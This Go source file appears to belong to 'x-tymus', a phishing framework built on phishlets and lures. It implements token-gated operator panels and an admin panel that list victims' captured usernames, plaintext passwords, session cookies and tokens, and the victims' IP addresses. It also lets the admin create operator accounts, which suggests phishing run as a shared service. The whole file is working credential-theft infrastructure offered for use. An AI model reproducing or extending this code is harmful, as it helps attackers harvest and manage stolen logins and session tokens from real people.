package core

import (
	"fmt"
	"html/template"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

// ---- shared HTML shell ----

const panelCSS = `
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d0d0d;color:#e0e0e0;font-family:'Segoe UI',monospace;font-size:14px}
h1{color:#e05252;font-size:1.4rem;margin-bottom:4px}
h2{color:#e0a040;font-size:1.1rem;margin:20px 0 8px}
a{color:#52b0e0;text-decoration:none}
a:hover{text-decoration:underline}
.wrap{max-width:1200px;margin:0 auto;padding:24px 16px}
.topbar{background:#161616;border-bottom:1px solid #2a2a2a;padding:12px 24px;display:flex;align-items:center;gap:16px}
.topbar .brand{color:#e05252;font-size:1.1rem;font-weight:bold;letter-spacing:1px}
.topbar .sub{color:#555;font-size:.85rem}
.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:.78rem;font-weight:bold}
.badge-green{background:#1a3a1a;color:#52e052}
.badge-red{background:#3a1a1a;color:#e05252}
.badge-blue{background:#1a2a3a;color:#52b0e0}
.badge-gray{background:#222;color:#888}
.stats{display:flex;gap:16px;margin:16px 0}
.stat-box{background:#161616;border:1px solid #2a2a2a;border-radius:6px;padding:12px 20px;min-width:120px}
.stat-box .n{font-size:1.8rem;font-weight:bold;color:#e05252}
.stat-box .l{font-size:.78rem;color:#666;margin-top:2px}
table{width:100%;border-collapse:collapse;margin-top:8px}
th{background:#181818;color:#888;font-size:.78rem;text-transform:uppercase;padding:8px 10px;text-align:left;border-bottom:1px solid #2a2a2a}
td{padding:7px 10px;border-bottom:1px solid #1a1a1a;font-size:.86rem;vertical-align:top}
tr:hover td{background:#141414}
.mono{font-family:monospace;font-size:.82rem;color:#aaa}
.url{font-family:monospace;font-size:.8rem;color:#52b0e0;word-break:break-all}
form.inline{display:inline}
input[type=text],input[type=password]{background:#1a1a1a;border:1px solid #333;color:#e0e0e0;padding:6px 10px;border-radius:4px;font-size:.86rem;width:180px}
input[type=text]:focus,input[type=password]:focus{outline:none;border-color:#555}
button,input[type=submit]{background:#2a1a1a;border:1px solid #552222;color:#e05252;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:.83rem}
button:hover,input[type=submit]:hover{background:#3a2020;border-color:#884444}
.btn-blue{background:#1a1e2a;border-color:#224466;color:#52b0e0}
.btn-blue:hover{background:#1e2a3a;border-color:#336699}
.section{margin-top:28px}
.form-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px}
.tag{font-size:.72rem;padding:1px 6px;border-radius:3px;background:#1e1e1e;color:#666;border:1px solid #2a2a2a}
.empty{color:#444;font-style:italic;padding:14px 10px}
`

func panelPage(title, body string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>%s — x-tymus</title>
<style>%s</style>
</head>
<body>
<div class="topbar">
  <span class="brand">x-tymus</span>
  <span class="sub">%s</span>
</div>
<div class="wrap">%s</div>
</body></html>`, title, panelCSS, title, body)
}

// ---- User Panel (/panel/<token>) ----

func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) < 2 {
		http.NotFound(w, r)
		return
	}
	token := parts[1]

	user, err := s.Db.UserGetByToken(token)
	if err != nil {
		http.Error(w, "Invalid panel token", http.StatusForbidden)
		return
	}

	lures := s.Cfg.GetLuresByUser(user.Username)
	sessions, _ := s.Db.ListSessions()

	// filter sessions belonging to this user's phishlets
	userPhishlets := map[string]bool{}
	for _, l := range lures {
		userPhishlets[l.Phishlet] = true
	}
	var userSessions []*database.Session
	for _, sess := range sessions {
		if userPhishlets[sess.Phishlet] {
			userSessions = append(userSessions, sess)
		}
	}

	totalTokens := 0
	for _, sess := range userSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	var b strings.Builder

	// Stats
	b.WriteString(fmt.Sprintf(`
<h1>User Panel</h1>
<p style="color:#666;margin-top:4px">Logged in as <span style="color:#52b0e0">%s</span></p>
<div class="stats">
  <div class="stat-box"><div class="n">%d</div><div class="l">Lures</div></div>
  <div class="stat-box"><div class="n">%d</div><div class="l">Sessions</div></div>
  <div class="stat-box"><div class="n" style="color:#52e052">%d</div><div class="l">With Tokens</div></div>
</div>`, user.Username, len(lures), len(userSessions), totalTokens))

	// Lures table
	b.WriteString(`<div class="section"><h2>Your Lures</h2>`)
	if len(lures) == 0 {
		b.WriteString(`<div class="empty">No lures assigned yet.</div>`)
	} else {
		b.WriteString(`<table><thead><tr>
<th>#</th><th>Phishlet</th><th>Path</th><th>Redirect</th><th>Info</th>
</tr></thead><tbody>`)
		for i, l := range lures {
			redirect := l.RedirectUrl
			if redirect == "" {
				redirect = `<span style="color:#555">—</span>`
			} else {
				redirect = fmt.Sprintf(`<a href="%s" target="_blank">%s</a>`, template.HTMLEscapeString(redirect), template.HTMLEscapeString(truncateStr(redirect, 40)))
			}
			info := l.Info
			if info == "" {
				info = `<span style="color:#555">—</span>`
			}
			b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-blue">%s</span></td>
<td class="url">%s</td>
<td class="mono" style="font-size:.78rem">%s</td>
<td>%s</td>
</tr>`, i, template.HTMLEscapeString(l.Phishlet), template.HTMLEscapeString(l.Path), redirect, info))
		}
		b.WriteString(`</tbody></table>`)
	}
	b.WriteString(`</div>`)

	// Sessions table
	b.WriteString(`<div class="section"><h2>Captured Sessions</h2>`)
	if len(userSessions) == 0 {
		b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
	} else {
		b.WriteString(`<table><thead><tr>
<th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>Tokens</th><th>Remote IP</th><th>Time</th>
</tr></thead><tbody>`)
		for _, sess := range userSessions {
			tokensBadge := `<span class="badge badge-gray">none</span>`
			if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
				tokensBadge = `<span class="badge badge-green">captured</span>`
			}
			uname := sess.Username
			if uname == "" {
				uname = `<span style="color:#555">—</span>`
			}
			pass := sess.Password
			if pass == "" {
				pass = `<span style="color:#555">—</span>`
			}
			b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span></td>
<td class="mono">%s</td>
<td class="mono">%s</td>
<td>%s</td>
<td class="mono">%s</td>
<td class="mono">%s</td>
</tr>`,
				sess.Id,
				template.HTMLEscapeString(sess.Phishlet),
				uname, pass, tokensBadge,
				template.HTMLEscapeString(sess.RemoteAddr),
				time.Unix(sess.UpdateTime, 0).Format("2006-01-02 15:04"),
			))
		}
		b.WriteString(`</tbody></table>`)
	}
	b.WriteString(`</div>`)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("User Panel", b.String()))
}

// ---- Admin Panel (/admin/panel) ----

func (s *HttpServer) requireAdminAuth(w http.ResponseWriter, r *http.Request) bool {
	pass := s.Cfg.GetAdminPassword()
	if pass == "" {
		http.Error(w, "Admin password not configured. Run: config admin_password <pass>", http.StatusForbidden)
		return false
	}
	user, pw, ok := r.BasicAuth()
	if !ok || user != "admin" || pw != pass {
		w.Header().Set("WWW-Authenticate", `Basic realm="x-tymus Admin"`)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return false
	}
	return true
}

func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdminAuth(w, r) {
		return
	}

	// Handle POST actions
	if r.Method == http.MethodPost {
		r.ParseForm()
		action := r.FormValue("action")
		switch action {
		case "create_user":
			uname := strings.TrimSpace(r.FormValue("username"))
			pass := strings.TrimSpace(r.FormValue("password"))
			if uname == "" || pass == "" {
				http.Redirect(w, r, "/admin/panel?err=empty", http.StatusSeeOther)
				return
			}
			token := GenRandomToken()
			if _, err := s.Db.CreateUser(uname, pass, token); err != nil {
				log.Error("admin panel: create user: %v", err)
				http.Redirect(w, r, "/admin/panel?err="+err.Error(), http.StatusSeeOther)
				return
			}
			log.Info("admin panel: created user '%s'", uname)
			http.Redirect(w, r, "/admin/panel", http.StatusSeeOther)
			return
		case "delete_user":
			id, _ := strconv.Atoi(r.FormValue("id"))
			if err := s.Db.DeleteUserById(id); err != nil {
				log.Error("admin panel: delete user: %v", err)
			}
			http.Redirect(w, r, "/admin/panel", http.StatusSeeOther)
			return
		}
	}

	userList, _ := s.Db.ListUsers()
	allSessions, _ := s.Db.ListSessions()
	allLures := s.Cfg.GetAllLures()

	// session counts per user
	sessPerUser := map[string]int{}
	tokenPerUser := map[string]int{}
	for _, sess := range allSessions {
		for _, l := range allLures {
			if l.Phishlet == sess.Phishlet && l.UserId != "" {
				sessPerUser[l.UserId]++
				if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
					tokenPerUser[l.UserId]++
				}
				break
			}
		}
	}

	totalTokens := 0
	for _, sess := range allSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	errMsg := r.URL.Query().Get("err")

	var b strings.Builder

	b.WriteString(fmt.Sprintf(`
<h1>Admin Panel</h1>
<div class="stats">
  <div class="stat-box"><div class="n">%d</div><div class="l">Users</div></div>
  <div class="stat-box"><div class="n">%d</div><div class="l">Lures</div></div>
  <div class="stat-box"><div class="n">%d</div><div class="l">Sessions</div></div>
  <div class="stat-box"><div class="n" style="color:#52e052">%d</div><div class="l">With Tokens</div></div>
</div>`,
		len(userList), len(allLures), len(allSessions), totalTokens))

	if errMsg != "" {
		b.WriteString(fmt.Sprintf(`<div style="color:#e05252;background:#1a0a0a;border:1px solid #3a1a1a;border-radius:4px;padding:8px 12px;margin:12px 0">Error: %s</div>`, template.HTMLEscapeString(errMsg)))
	}

	// ---- Users section ----
	b.WriteString(`<div class="section"><h2>Users</h2>`)
	b.WriteString(`<form method="POST" action="/admin/panel">
<input type="hidden" name="action" value="create_user">
<div class="form-row">
  <input type="text" name="username" placeholder="username" required>
  <input type="password" name="password" placeholder="password" required>
  <input type="submit" value="+ Create User" class="btn-blue">
</div>
</form>`)

	if len(userList) == 0 {
		b.WriteString(`<div class="empty">No users yet.</div>`)
	} else {
		b.WriteString(`<table><thead><tr>
<th>Username</th><th>Panel URL</th><th>Lures</th><th>Sessions</th><th>Tokens</th><th>Created</th><th></th>
</tr></thead><tbody>`)
		for _, st := range userList {
			lureCount := 0
			for _, l := range allLures {
				if l.UserId == st.Username {
					lureCount++
				}
			}
			panelURL := fmt.Sprintf("/panel/%s", st.Token)
			b.WriteString(fmt.Sprintf(`<tr>
<td><span class="badge badge-blue">%s</span></td>
<td><a href="%s" target="_blank" class="url">%s</a></td>
<td class="mono">%d</td>
<td class="mono">%d</td>
<td class="mono" style="color:#52e052">%d</td>
<td class="mono">%s</td>
<td>
  <form class="inline" method="POST" action="/admin/panel" onsubmit="return confirm('Delete user %s?')">
    <input type="hidden" name="action" value="delete_user">
    <input type="hidden" name="id" value="%d">
    <button type="submit">Delete</button>
  </form>
</td>
</tr>`,
				template.HTMLEscapeString(st.Username),
				panelURL, panelURL,
				lureCount,
				sessPerUser[st.Username],
				tokenPerUser[st.Username],
				time.Unix(st.CreatedAt, 0).Format("2006-01-02"),
				template.HTMLEscapeString(st.Username),
				st.Id,
			))
		}
		b.WriteString(`</tbody></table>`)
	}
	b.WriteString(`</div>`)

	// ---- All Lures ----
	b.WriteString(`<div class="section"><h2>All Lures</h2>`)
	if len(allLures) == 0 {
		b.WriteString(`<div class="empty">No lures configured.</div>`)
	} else {
		b.WriteString(`<table><thead><tr>
<th>#</th><th>Phishlet</th><th>Path</th><th>User</th><th>Redirect</th>
</tr></thead><tbody>`)
		for i, l := range allLures {
			userLabel := `<span style="color:#555">unassigned</span>`
			if l.UserId != "" {
				userLabel = fmt.Sprintf(`<span class="badge badge-blue">%s</span>`, template.HTMLEscapeString(l.UserId))
			}
			redirect := `<span style="color:#555">—</span>`
			if l.RedirectUrl != "" {
				redirect = fmt.Sprintf(`<a href="%s" target="_blank">%s</a>`, template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 40)))
			}
			b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span></td>
<td class="url">%s</td>
<td>%s</td>
<td class="mono" style="font-size:.78rem">%s</td>
</tr>`, i, template.HTMLEscapeString(l.Phishlet), template.HTMLEscapeString(l.Path), userLabel, redirect))
		}
		b.WriteString(`</tbody></table>`)
	}
	b.WriteString(`</div>`)

	// ---- All Sessions ----
	b.WriteString(`<div class="section"><h2>All Sessions</h2>`)
	if len(allSessions) == 0 {
		b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
	} else {
		b.WriteString(`<table><thead><tr>
<th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>Tokens</th><th>Remote IP</th><th>Time</th>
</tr></thead><tbody>`)
		for _, sess := range allSessions {
			tokensBadge := `<span class="badge badge-gray">none</span>`
			if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
				tokensBadge = `<span class="badge badge-green">captured</span>`
			}
			uname := template.HTMLEscapeString(sess.Username)
			if uname == "" {
				uname = `<span style="color:#555">—</span>`
			}
			pass := template.HTMLEscapeString(sess.Password)
			if pass == "" {
				pass = `<span style="color:#555">—</span>`
			}
			b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span></td>
<td class="mono">%s</td>
<td class="mono">%s</td>
<td>%s</td>
<td class="mono">%s</td>
<td class="mono">%s</td>
</tr>`,
				sess.Id,
				template.HTMLEscapeString(sess.Phishlet),
				uname, pass, tokensBadge,
				template.HTMLEscapeString(sess.RemoteAddr),
				time.Unix(sess.UpdateTime, 0).Format("2006-01-02 15:04"),
			))
		}
		b.WriteString(`</tbody></table>`)
	}
	b.WriteString(`</div>`)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("Admin Panel", b.String()))
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
